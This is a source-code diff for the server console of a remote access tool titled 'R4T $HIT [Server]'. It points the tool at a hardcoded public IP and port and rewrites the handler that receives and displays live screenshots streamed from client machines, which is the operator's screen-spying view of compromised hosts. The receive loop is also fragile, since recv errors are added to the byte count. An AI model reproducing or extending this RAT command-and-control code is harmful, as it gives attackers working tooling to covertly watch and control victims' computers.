@@ -18,8 +18,8 @@ wchar_t g_szClassName[] = L"Server";
 const wchar_t* wn_title = L"R4T $HIT [Server]";
 wchar_t g_szClientClassName[] = L"Client Screen";
 
-const char* ServerIP = "127.0.0.1"; //139.162.166.201 server
-int PORT = 9865; //9698 server | localhost 9865
+const char* ServerIP = "139.162.166.201"; //139.162.166.201 server
+int PORT = 9698; //9698 server | localhost 9865
 int counter;
 
 BOOL ishwndClient = false;
@@ -657,7 +657,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 
 LRESULT CALLBACK ClientWndProc(HWND Chwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 {
-
     std::vector<char> buffer;
     std::unique_ptr<char[]> imageBuffer;
 
@@ -688,74 +687,79 @@ LRESULT CALLBACK ClientWndProc(HWND Chwnd, UINT uMsg, WPARAM wParam, LPARAM lPar
 
     case WM_PAINT:
     {
-        SOCKET selectedSocket = clientSockets[itemIndex];
-        auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
-
-        if (it != clientSockets.end())
+        int bufferLen = 0;
+        const int MAX_BYTES = 100000;
+        Sleep(1000 / 20);
+        do
         {
-            Sleep(1000 / 15);
+            SOCKET selectedSocket = clientSockets[itemIndex];
+
+            
             ULONGLONG bufferLenNetworkOrder = 0;
             int bytesReceived = 0;
             int rerr = 0;
+           
+            while (bytesReceived < sizeof(bufferLenNetworkOrder)) {
+                rerr = recv(selectedSocket, (char*)&bufferLenNetworkOrder + bytesReceived, sizeof(bufferLenNetworkOrder) - bytesReceived, 0);
+                bytesReceived += rerr;
+            }
+            bufferLen = ntohll(bufferLenNetworkOrder);
 
-            try
+            if (bufferLen > 0 && bufferLen < MAX_BYTES)
             {
-                while (bytesReceived < sizeof(bufferLenNetworkOrder)) {
-                    rerr = recv(selectedSocket, (char*)&bufferLenNetworkOrder + bytesReceived, sizeof(bufferLenNetworkOrder) - bytesReceived, 0);
+                imageBuffer.reset(new char[bufferLen]);
+            }
+
+            bytesReceived = 0;
+
+            if (bufferLen < 0 || bufferLen > MAX_BYTES)
+            {
+                continue;
+            }
+
+            while (bytesReceived < bufferLen && bufferLen < MAX_BYTES) {
+                //MessageBoxA(NULL, std::to_string(bufferLen - bytesReceived).c_str(), "CHECK", MB_OK);
+                rerr = recv(selectedSocket, imageBuffer.get() + bytesReceived, bufferLen - bytesReceived, 0);
+                if (rerr > 0 && rerr <= bufferLen - bytesReceived) {
                     bytesReceived += rerr;
                 }
-                int bufferLen = ntohll(bufferLenNetworkOrder);
-
-                if (bufferLen > 100000) {
+                else {
                     return {};
                 }
-
-                imageBuffer.reset(new char[bufferLen]);
-                bytesReceived = 0;
-
-                while (bytesReceived < bufferLen) {
-                    rerr = recv(selectedSocket, imageBuffer.get() + bytesReceived, bufferLen - bytesReceived, 0);
-                    bytesReceived += rerr;
-                }
-
-
-                HGLOBAL hGlobal = GlobalAlloc(GHND, bufferLen);
-                void* pData = GlobalLock(hGlobal);
-                memcpy(pData, imageBuffer.get(), bufferLen);
-
-                GlobalUnlock(hGlobal);
-
-                IStream* pStream = NULL;
-                CreateStreamOnHGlobal(hGlobal, TRUE, &pStream);
-
-                Gdiplus::Bitmap bitmap(pStream);
-                Gdiplus::Status status = bitmap.GetLastStatus();
-
-
-                PAINTSTRUCT ps;
-                HDC hdc = BeginPaint(Chwnd, &ps);
-
-                int imgWidth = bitmap.GetWidth();
-                int imgHeight = bitmap.GetHeight();
-
-                Gdiplus::Graphics graphics(hdc);
-
-                RECT clientRect;
-                GetClientRect(Chwnd, &clientRect);
-
-                graphics.DrawImage(&bitmap, 0, 0, imgWidth, imgHeight);
-                EndPaint(Chwnd, &ps);
-                GlobalFree(hGlobal);
-                pStream->Release();
-                imageBuffer.reset();
-            }
-            catch (std::bad_alloc& e)
-            {
-                DestroyWindow(hwndClient);
             }
 
-        }
-        
+            HGLOBAL hGlobal = GlobalAlloc(GHND, bufferLen);
+            void* pData = GlobalLock(hGlobal);
+            memcpy(pData, imageBuffer.get(), bufferLen);
+
+            GlobalUnlock(hGlobal);
+
+            IStream* pStream = NULL;
+            CreateStreamOnHGlobal(hGlobal, TRUE, &pStream);
+
+            Gdiplus::Bitmap bitmap(pStream);
+            Gdiplus::Status status = bitmap.GetLastStatus();
+
+
+            PAINTSTRUCT ps;
+            HDC hdc = BeginPaint(Chwnd, &ps);
+
+            int imgWidth = bitmap.GetWidth();
+            int imgHeight = bitmap.GetHeight();
+
+            Gdiplus::Graphics graphics(hdc);
+
+            RECT clientRect;
+            GetClientRect(Chwnd, &clientRect);
+
+            graphics.DrawImage(&bitmap, 0, 0, imgWidth, imgHeight);
+            GlobalFree(hGlobal);
+            pStream->Release();
+            imageBuffer.reset(nullptr);
+
+            EndPaint(Chwnd, &ps);
+            break;
+        } while (bufferLen < 0 || bufferLen > MAX_BYTES);
         break;
     }
 
